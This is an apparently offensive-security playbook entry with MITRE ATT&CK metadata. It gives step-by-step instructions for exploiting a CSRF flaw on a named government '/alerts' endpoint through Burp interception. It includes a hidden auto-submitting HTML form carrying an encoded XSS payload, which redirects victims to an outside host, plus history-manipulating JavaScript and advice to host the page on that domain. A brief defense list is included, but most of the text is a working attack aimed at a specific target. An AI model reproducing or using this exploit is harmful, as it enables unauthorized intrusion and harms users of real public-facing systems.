---
id: p2b3c4d5-f6e7-8901-bcde-f23456789012
tags:
  - csrf
  - html
  - burp
type: procedure
tools:
  - '[[tools/Burp-Suite-Professional]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/csrf-form-auto-submit]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:49.604Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-CSRF-HTML-Page-with-Burp-Suite

## Summary

This procedure uses Burp Suite to intercept and modify a legitimate request, creating a malicious HTML page with a hidden form that exploits CSRF by auto-submitting a POST to the /alerts endpoint, embedding an XSS payload.

## Description

The DoD application's /alerts endpoint lacks CSRF tokens or same-origin checks, allowing forged requests. Intercept a real POST, extract the CSRF token and parameters, then build an HTML form with the XSS payload in 'source[]'. Auto-submit ensures no user interaction. Target: https://www.target.gov/alerts.

## Requirements

1. Burp Suite Professional for request interception
2. Valid CSRF token from an authenticated session
3. Encoded XSS payload from prior procedure

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens with unique, time-bound values
- Validate origin headers and use SameSite cookies
- Log and alert on unexpected POSTs from external referrers

## Objectives

1. Forge an authenticated POST request
2. Inject XSS payload via the request
3. Automate submission for seamless exploitation

## Instructions

### Step 1: Intercept Legitimate Request

**Context**: Use Burp to capture a real /alerts POST and note parameters like CSRF token and search fields.

Configure Burp proxy and submit a test form in the app.

### Step 2: Build Malicious HTML Form

**Context**: Create a hidden form with the intercepted data, adding the encoded XSS payload to 'source[]'.

Form example:
```html
<form method="POST" action="https://www.target.gov/alerts">
  <input type="hidden" name="csrf_token" value="extracted_token">
  <input type="hidden" name="source[]" value="video&quot;&#41;&#59;&#13;&#10;alert&#40;&apos;Hacked&#32;by&#32;k0x&apos;&#41;&#59;&#13;&#10;setTimeout&#40;&#40;&#41;&#61;&gt;location&#46;href&#61;&apos;https&#58;&#47;&#47;k0x&#46;xyz&apos;&#44;5000&#41;&#59;&#47;&#47;">
  <!-- Other params -->
</form>
```

### Step 3: Add Auto-Submit Script

**Context**: Embed JavaScript to submit the form on page load and manipulate history.

**Command** ([[commands/csrf-form-auto-submit]]):
```javascript
history.pushState('','','/'); document.forms[0].submit();
```

> This updates the URL to '/' without reload and submits the form. Place in <script> tag; expected output is automatic POST submission observable in network tab.

Host the HTML on a server like k0x.xyz.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/csrf-form-auto-submit]]

## Tools Used

- [[tools/Burp-Suite-Professional]]

## Tags

- [[csrf]]
- [[html]]
- [[burp]]
